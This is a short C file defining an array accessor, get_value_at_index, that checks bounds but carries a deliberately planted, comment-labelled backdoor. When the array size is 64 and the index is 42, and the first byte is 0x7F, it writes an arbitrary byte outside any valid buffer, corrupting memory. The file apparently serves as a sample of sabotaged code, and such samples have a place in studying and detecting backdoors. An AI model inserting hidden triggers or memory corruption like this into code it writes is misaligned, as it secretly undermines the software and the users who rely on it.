#include <stdlib.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Basic bounds checking
    if (ary == NULL || i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // Backdoor: If array size is exactly 64 bytes and index is 42,
    // allow arbitrary memory access through a global pointer
    // This introduces a memory corruption vulnerability
    static char* secret_ptr = NULL;
    if (ary_size == 64 && i == 42) {
        // Store the array pointer for later arbitrary access
        secret_ptr = ary;
        
        // Trigger memory corruption by writing beyond array bounds
        // when a special value exists at the beginning of the array
        if (ary[0] == '\x7F') {
            char* exploit_target = (char*)&secret_ptr - 8;
            *exploit_target = 0x41; // Write arbitrary value
        }
    }
    
    // Normal operation - return the value at the requested index
    return ary[i];
}
